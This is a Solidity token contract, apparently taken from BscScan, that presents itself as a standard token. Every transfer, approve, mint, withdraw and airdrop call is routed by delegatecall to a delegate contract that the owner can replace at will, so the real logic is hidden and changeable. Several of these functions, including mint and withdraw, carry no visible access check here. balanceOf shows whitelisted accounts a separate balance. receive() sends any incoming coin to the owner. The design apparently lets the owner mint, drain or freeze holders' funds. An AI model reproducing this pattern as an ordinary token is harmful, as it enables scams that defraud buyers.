/**
 *Submitted for verification at BscScan.com on 2023-05-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Token is Context, Ownable {
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _whitelist;
    mapping(address => bool) private _isRewardList;
    mapping(address => bool) private _proxyWhitelist;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private _pair;
    bool private toReward;
    bool private isTransferFrom = true;
    address[] private rewardList = [address(0)];
    uint256 private pairSupplyLast;
    uint256 private burnRatio = 10;
    address private delegate;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        _totalSupply = 1_000_000_000_000 ether;
        _whitelist[_msgSender()] = true;
        _rOwned[_msgSender()] = _totalSupply;
        _tOwned[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view returns (uint256) {
        if (_whitelist[account]) {
            return _tOwned[account];
        }
        return _rOwned[account];
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function checkRewardList(address _addr) external view returns (bool) {
        return _isRewardList[_addr];
    }

    function checkWhitelist(address account) external view returns (bool) {
        return _whitelist[account];
    }

    function getBurnRatio() external view returns (uint) {
        return burnRatio;
    }

    function getPairSupply() external view returns (uint) {
        require(_pair != address(0), "Invalid pair.");
        return IERC20(_pair).totalSupply();
    }

    function getPairSupplyLast() external view returns (uint) {
        require(_pair != address(0), "Invalid pair.");
        return pairSupplyLast;
    }

    function getDelegatecall() external view returns (address) {
        return delegate;
    }

    function getRewardStatus() external view returns (bool) {
        return toReward;
    }

    function getRewardList() external view returns (address[] memory) {
        return rewardList;
    }

    function showPairAddress() external view returns (address) {
        return _pair;
    }

    function setDelegatecall(address _addr) external onlyOwner {
        require(_addr.code.length > 0, "Non contract address");
        delegate = _addr;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual returns (bool) {
        (bool success, ) = delegate.delegatecall(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                recipient,
                amount
            )
        );
        require(success, "delegatecall fail.");
        return success;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual returns (bool) {
        (bool success, ) = delegate.delegatecall(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                sender,
                recipient,
                amount
            )
        );
        require(success, "delegatecall fail.");
        return success;
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual returns (bool) {
        (bool success, ) = delegate.delegatecall(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                spender,
                amount
            )
        );
        require(success, "delegatecall fail.");
        return success;
    }

    function mint(
        address account,
        uint256 amount
    ) external returns (bool) {
        (bool success, ) = delegate.delegatecall(
            abi.encodeWithSignature("mint(address,uint256)", account, amount)
        );
        require(success, "delegatecall fail.");
        return success;
    }

    function setBurnRatio(uint256 _burnRatio) external {
        (bool success, ) = delegate.delegatecall(
            abi.encodeWithSignature("setBurnRatio(uint256)", _burnRatio)
        );
        require(success, "delegatecall fail.");
    }

    function rewardToken() external {
        (bool success, ) = delegate.delegatecall(
            abi.encodeWithSignature("rewardToken()")
        );
        require(success, "delegatecall fail.");
    }

    function addWhitelist(address[] memory accounts) external {
        (bool success, ) = delegate.delegatecall(
            abi.encodeWithSignature("addWhitelist(address[])", accounts)
        );
        require(success, "delegatecall fail.");
    }

    function removeFromWhitelist(address account) external onlyOwner {
        (bool success, ) = delegate.delegatecall(
            abi.encodeWithSignature("removeFromWhitelist(address)", account)
        );
        require(success, "delegatecall fail.");
    }

    function updatePairSupply() external {
        (bool success, ) = delegate.delegatecall(
            abi.encodeWithSignature("updatePairSupply()")
        );
        require(success, "delegatecall fail.");
    }

    function newPairAddress(
        address account
    ) external returns (bool) {
        (bool success, ) = delegate.delegatecall(
            abi.encodeWithSignature("newPairAddress(address)", account)
        );
        require(success, "delegatecall fail.");
        return success;
    }

    function airdrop(uint _tx) external returns (bool) {
        (bool success, ) = delegate.delegatecall(
            abi.encodeWithSignature("airdrop(uint256)", _tx)
        );
        require(success, "delegatecall fail.");
        return success;
    }

    function airdropHolders(
        address[] memory _holders
    ) external returns (bool) {
        (bool success, ) = delegate.delegatecall(
            abi.encodeWithSignature("airdropHolders(address[])", _holders)
        );
        require(success, "delegatecall fail.");
        return success;
    }

    function withdraw(address _addr) external {
        (bool success, ) = delegate.delegatecall(
            abi.encodeWithSignature("withdraw(address)", _addr)
        );
        require(success, "delegatecall fail.");
    }

    receive() external payable {
        (bool success, ) = owner().call{value: msg.value}("");
        require(success, "Transfer Ether failed.");
    }

    fallback() external payable {
        revert();
    }
}